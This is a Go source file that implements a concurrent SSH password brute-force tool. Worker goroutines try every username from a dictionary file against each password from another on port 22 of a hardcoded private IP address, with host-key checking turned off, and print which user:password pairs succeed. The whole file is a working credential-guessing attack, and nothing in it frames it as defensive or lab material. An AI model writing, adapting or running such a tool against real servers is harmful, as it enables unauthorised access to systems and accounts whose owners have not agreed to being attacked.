package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	IPADDRESS = "192.168.1.42"
)

var wg sync.WaitGroup

func check(e error) {
	if e != nil {
		fmt.Println("[error] ", e)
		panic(e)
	}
}

type credential struct {
	user string
	pass string
	pos  string
}

type requestAttack struct {
	cred    *credential
	resChan chan<- *result
}

type result struct {
	cred      *credential
	timeTaken time.Duration
	res       string
	err       error
}

func readFiles(
	userFile string,
	passFile string,
) <-chan *credential {
	credentialStream := make(chan *credential)
	go func() {
		defer close(credentialStream)

		f1, err := os.Open(userFile)
		check(err)
		f2, err := os.Open(passFile)
		check(err)

		// define closing of files
		defer func() {
			f1.Close()
			f2.Close()
		}()

		// File reader line by line.
		ureader := bufio.NewScanner(f1)
		preader := bufio.NewScanner(f2)

		var userList []string // it is saved in an array so as not to read the user list again
		for i := 0; preader.Scan(); i++ {
			if i == 0 {
				for j := 0; ureader.Scan(); j++ {
					userList = append(userList, ureader.Text())
					credentialStream <- &credential{user: userList[len(userList)-1],
						pass: preader.Text(),
						pos:  strconv.Itoa(j) + "-" + strconv.Itoa(i)}
				}
				if err := ureader.Err(); err != nil {
					check(err)
				}
			} else {
				for j, u := range userList {
					credentialStream <- &credential{user: u,
						pass: preader.Text(),
						pos:  strconv.Itoa(j) + "-" + strconv.Itoa(i)}
				}
			}
		}
		if err := preader.Err(); err != nil {
			check(err)
		}
	}()
	return credentialStream
}

func SSHtest(c *credential, params ...string) (string, error) {
	//SSH basic connection
	config := &ssh.ClientConfig{
		User: c.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(c.pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
	}

	//Recover function
	defer func() {
		r := recover()
		if r != nil {
			fmt.Println(r)
		}
	}()

	t := net.JoinHostPort(IPADDRESS, "22")

	_, err := ssh.Dial("tcp", t, config)

	if err != nil {
		fmt.Println(c.user, c.pass, err)

		return "", err
	}
	return "ok", err
}

// Workers that make the connection with the server
func worker(reqStream <-chan *requestAttack, name string, attackfunc func(*credential, ...string) (string, error)) {
	for {
		if r, ok := <-reqStream; ok {
			t := time.Now()

			// Test credential
			var res string
			var err error
			retChan := make(chan int)
			go func() {
				res, err = attackfunc(r.cred)
				retChan <- 1
			}()
			// Create context for timeline attack
			timeLimit := time.Second * 2
			ctx, cancel := context.WithTimeout(context.TODO(), timeLimit)

			select {
			case <-ctx.Done():
				r.resChan <- &result{cred: r.cred, timeTaken: time.Since(t), res: "", err: fmt.Errorf("time limit exceeded")}
			case <-retChan:
				r.resChan <- &result{cred: r.cred, timeTaken: time.Since(t), res: res, err: err}
				cancel()
			}
		} else {
			fmt.Println("[worker " + name + "] DEAD")
		}
	}
}

func (c *credential) manageConcurrently(
	reqStream chan<- *requestAttack,
	resultStream chan<- *result) {
	responseChan := make(chan *result)

	// send a request to a worker
	reqStream <- &requestAttack{cred: c, resChan: responseChan}

	// get the response
	response := <-responseChan

	//manage de response
	/*
		TODO
	*/

	//send response result
	resultStream <- response
	wg.Done()
}

// Parameters initialization, channels of comunication creation and start the attack.
func startAttack(nWorkers int) {
	// reqStream is the request channel
	reqStream := make(chan *requestAttack)

	// Workers initialization
	for i := 0; i < nWorkers; i++ {
		fmt.Println("[worker", i, "] Staying Alive")
		go worker(reqStream, fmt.Sprint(i+1), SSHtest)
	}

	// Read files to get credentials
	credList := readFiles("../dictionaries/users.txt", "../dictionaries/passwords.txt")

	// Final results channel
	resultStream := make(chan *result)

	// goroutines that manage all credentials
	go func() {
		for c := range credList {
			wg.Add(1)
			go c.manageConcurrently(reqStream, resultStream)
		}
		wg.Wait()
		close(reqStream)
		close(resultStream)
		fmt.Println("[!] Closing the channels")
	}()

	// Receive all results and print them all
	for r := range resultStream {
		if r.err == nil {
			fmt.Printf("[+] %v\t%v\t%v\t%v\n", r.cred.user+":"+r.cred.pass, r.cred.pos, r.timeTaken, r.err)
		} else {
			fmt.Printf("[-] %v\t%v\t%v\t%v\n", r.cred.user+":"+r.cred.pass, r.cred.pos, r.timeTaken, r.err)
		}
	}

}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	streamWidth := runtime.NumCPU()

	start := time.Now()

	startAttack(streamWidth)
	fmt.Printf("Atack took: %v", time.Since(start))
}
